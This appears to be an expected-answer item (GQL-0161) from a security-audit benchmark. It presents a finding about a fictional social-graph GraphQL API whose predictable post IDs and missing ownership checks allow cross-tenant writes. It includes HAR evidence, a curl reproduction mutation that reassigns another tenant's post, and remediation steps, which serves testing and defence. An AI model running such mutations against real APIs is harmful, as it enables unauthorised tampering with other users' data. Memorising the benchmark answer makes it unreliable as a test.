# Expected Response

## System
- Domain: Social Media / Identity Graph
- System: Horizon Social Graph API
- Example ID: GQL-0161

## Priority Findings

### Finding 1: Social Media — Predictable Post IDs Enable Cross-Tenant Write Access (Pattern 1.8)
**Severity:** High
**Category:** BOLA / Predictable or Sequential IDs

**Summary:**
Per §5.0 (Pattern 1.8 — predictable or sequential IDs): Post IDs follow a predictable pattern enabling enumeration. The `updatePost` resolver accepts client-supplied `postId` without ownership verification. An attacker from `tenant-62dc` submitted `updatePost(id: "P-2161", input: {status: "approved", ownerId: "attacker-62dc7f5b"})` against a post belonging to `tenant-7f5b`, gaining cross-tenant write access including `CONFIDENTIAL-62dc7f5b`. In Social Media, predictable IDs combined with missing ownership checks enable mass manipulation of user content.

**Evidence from HAR:**
- Request: `POST https://api.horizon-social-graph.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-62dc`
- Mutation: `updatePost(id: "P-2161", input: {status: "approved", ownerId: "attacker-62dc7f5b"}) { postId status }`
- Response `200 OK`: `tenantId: "tenant-7f5b"`, `ownerId: "other-user-62dc7f5b"`, `sensitiveField: "CONFIDENTIAL-62dc7f5b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-62dc7f5b`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.8 | Predictable IDs, no ownership |
| HAR request | input.ownerId | attacker-62dc7f5b (client-injected) |
| HAR response | tenantId | Cross-tenant post data tenant-7f5b |
| HAR response | sensitiveField | CONFIDENTIAL-62dc7f5b |

## Steps to Reproduce

### Step 1 — updatePost predictable ID exploit (HAR)
```bash
curl -s -X POST https://api.horizon-social-graph.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-62dc" \
  -d '{"query": "mutation { updatePost(id: \"P-2161\", input: {status: \"approved\", ownerId: \"attacker-62dc7f5b\"}) { postId status } }"}'
```
**Vulnerable:** `tenant-7f5b` post mutated. **Secure:** FORBIDDEN.

## Remediation
1. Use UUID v4 (non-sequential) for post IDs.
2. Resolver: `WHERE post_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `PostInput`.
4. Redis cache key: `post:{tenantId}:{postId}`.
